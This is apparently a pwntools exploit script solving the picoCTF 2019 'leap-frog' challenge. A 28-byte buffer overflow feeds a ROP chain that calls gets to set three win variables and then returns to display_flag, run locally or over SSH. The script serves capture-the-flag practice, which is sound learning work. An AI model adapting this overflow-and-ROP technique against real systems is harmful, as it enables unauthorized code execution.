#!/usr/bin/env python

from pwn import *
import os

argv = sys.argv

#lead elf and get addresses
e = ELF('./rop')
gets_plt = e.plt['gets']
display_flag = e.symbols['display_flag']
win1 = e.symbols['win1']

if len(argv) > 1:
	from getpass import getpass
	ssh = ssh(host='2019shell1.picoctf.com', user='ems3t', password=getpass())
	p = ssh.process('rop', cwd='/problems/leap-frog_2_b375af7c48bb686629be6dd928a46897')
else:
	p = process('./rop')

payload = ''
payload+= 'A'*28
payload+= p32(gets_plt)			#calls gets function so we can write the win variables
payload+= p32(display_flag)		#returns to display flag
payload+= p32(win1)				#allows us to write to win1 address
p.sendlineafter('>', payload)
p.sendline('\x01'*3) 			#writes the value 1 to win1, win2, and win3
p.interactive()
